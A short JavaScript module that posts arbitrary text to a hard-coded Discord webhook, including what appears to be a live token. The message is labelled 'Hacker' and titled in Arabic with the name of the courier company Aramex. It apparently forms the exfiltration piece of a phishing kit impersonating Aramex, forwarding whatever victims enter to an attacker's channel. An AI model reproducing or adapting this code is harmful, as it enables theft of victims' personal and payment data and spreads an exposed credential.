import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328397462058307614/RGpQfzN2LdJaIWC31I6-KPhllGWnEf8CshHAQvX7SPjziCVKmb19NlfDqHKd-cVJVkr0",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
